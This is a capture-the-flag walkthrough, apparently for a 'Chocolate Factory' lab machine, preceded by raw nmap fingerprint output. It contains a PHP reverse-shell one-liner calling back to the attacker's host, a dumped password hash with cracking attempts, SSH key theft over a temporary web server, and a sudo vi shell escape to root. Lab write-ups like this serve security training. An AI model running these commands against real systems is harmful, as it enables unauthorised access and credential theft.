SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r
SF:(RPCCheck,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x
SF:20\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\
SF:.\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x2
SF:0____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\
SF:\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\
SF:\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\
SF:x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_
SF:_:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\
SF:n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;----------
SF:-------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/
SF:\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_
SF:_____________________;________________\|\r\n\r\nA\x20small\x20hint\x20f
SF:rom\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20he
SF:re!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port105-TCP:V=7.80%I=7%D=7/15%Time=6876A92E%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port106-TCP:V=7.80%I=7%D=7/15%Time=6876A92E%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port107-TCP:V=7.80%I=7%D=7/15%Time=6876A92E%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port108-TCP:V=7.80%I=7%D=7/15%Time=6876A938%P=x86_64-pc-linux-gnu%r(Get
SF:Request,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r
SF:(HTTPOptions,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x2
SF:0\x20\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.-------------
SF:--\.\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20
SF:\x20____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20
SF:__\\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20
SF:\\\\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\_
SF:__\x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x
SF:20__:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\
SF:\r\n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-------
SF:----------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20
SF:\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\
SF:\|______________________;________________\|\r\n\r\nA\x20small\x20hint\x
SF:20from\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x2
SF:0here!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x2
SF:0");
MAC Address: 02:8A:A5:FD:20:C7 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -39613d15h40m17s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 15 20:25:34 2025 -- 1 IP address (1 host up) scanned in 521.60 seconds
```

I noticed the ftp service allows the ftp user to login. I check it out:

```bash
$ ftp target.thm
Connected to target.thm.
220 (vsFTPd 3.0.5)
Name (target.thm:root): ftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lha
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 .
drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 ..
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.
ftp> get gum_room.jpg
local: gum_room.jpg remote: gum_room.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
226 Transfer complete.
208838 bytes received in 0.00 secs (76.5719 MB/s)
```

I downloaded the gum_room.jpg from from the ftp server. Since it is an image I ran steghide to see if it contained any hidden files:

```bash
$ steghide info gum_room.jpg
"gum_room.jpg":
  format: jpeg
  capacity: 10.9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
  embedded file "b64.txt":
    size: 2.5 KB
    encrypted: rijndael-128, cbc
    compressed: yes
$ steghide extract -sf gum_room.jpg
Enter passphrase:
wrote extracted data to "b64.txt".
```

The image had a hidden file called b64.txt. The contents are base64 encoded so I decode it:

```bash
$ cat b64.txt | base64 -d
...
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

I saved the hash `$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/` to a text file called hash.txt and tried to crack it with john. I never got a hit with this:

```bash
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
```

## Enter the key you found!

While that was running, I reviewed the nmap output and noticed the section about port 113:

```bash
113/tcp open  ident?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, NULL, RTSPRequest, TLSSessionReq, TerminalServer, X11Probe, oracle-tns:
|_    http://localhost/key_rev_key <- You will find the key here!!!
```

I grabbed the file with wget:

```bash
$ wget http://target.thm/key_rev_key
```

I tried to cat that file but it looks like an executable. Instead I ran strings on the file:

```bash
$ strings key_rev_key
...
Enter your name:
laksdhfas
 congratulations you have found the key:  
b'-Vk REDACTED Y='
```

That is the key the question is looking for.

## Getting a Foothold

Since john still didn't have a hit, I viewing the site and then ran gobuster:

```bash
$ gobuster dir -u http://target.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/home.php             (Status: 200) [Size: 569]
/validate.php         (Status: 200) [Size: 93]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 830572 / 830576 (100.00%)
===============================================================
Finished
===============================================================
```

I went to http://target.thm/home.php and saw that I can enter commands and get responses. I start a listener on my attack machine:

```bash
$ nc -lnvp 4444
````

I tried a few different ways to get a shell but running with PHP worked:

```bash
$ php -r '$sock=fsockopen("<attack_machine_ip>",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

I have a shell. I'm in!

I get a stable shell by running the commands [found here](/README.md#stable-shell).

## What is Charlie's password?

I see that I can't read the user.txt file at /home/charlie/user.txt. I also noticed an ssh key called teleport in that directory.

I am the www-data user so I go look at the /var/www/html directory. I look at the contents of the files and notice validate.php:

```bash
$ cat validate.php
<?php
	$uname=$_POST['uname'];
	$password=$_POST['password'];
	if($uname=="charlie" && $password=="REDACTED"){
		echo "<script>window.location='home.php'</script>";
	}
	else{
		echo "<script>alert('Incorrect Credentials');</script>";
		echo "<script>window.location='index.html'</script>";
	}
?>
```

That is charlie's password.

## Change user to charlie

I try to switch to the charlie user with that password but it doesn't work:

```bash
$ su charlie
Password: REDACTED

su: Authentication failure
```

I remembered that charlie's home directory has a teleport file. I am going to transfer that to my attack machine and see if I can ssh into the machine using it. Here is what I ran on the target box:

```bash
$ cd /home/charlie
$ python3 -m http.server
```

Then on my attack machine I ran the following:

```bash
$ wget http://target.thm:8000/teleport
$ chmod 600 teleport
```

Now that I have charlie's password and ssh key I try to log in as charlie:

```bash
$ ssh charlie@target.thm -i teleport
```

That worked!

## Enter the user flag

Ironically, the /home/charlie directory is not the home directory. I started at the root directory (/). I run the following commands to get the user.txt file:

```bash
$ cd /home/charlie
$ cat user.txt
REDACTED
```

## Escalating Privileges

I run my usual [privilege escalation commands](/concepts/privilege_escalation.md#linux-privilege-escalation) and have some luck with `sudo -l`:

```bash
$ sudo -l
Matching Defaults entries for charlie on ip-10-10-171-134:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on ip-10-10-171-134:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

Game over, I can get a shell with vi since it allows users to run shell commands from vi and I can run vi as sudo. I do just that:

```bash
$ sudo /usr/bin/vi
```

Then while in vi I run the following:

```bash
:!/bin/bash
```

It worked. I'm in! The cursor changed to the # character to let me know that I am root.

## Enter the root flag

I try to get the flag but it is a python script and it doesn't work even when I give it the correct ticket found earlier in the http://target.thm/key_rev_key file:

```bash
# whoami
root
# cd /root
# ls
root.py  snap
# cat root.py
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'REDACTED'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)
```

I head to the https://asecuritysite.com/tokens/ferdecode website and enter ticket found in http://target.thm/key_rev_key as the Key. I use the string in the encrypted_mess variable of the root.py file as the Token. It outputs the flag in the Decoded field.
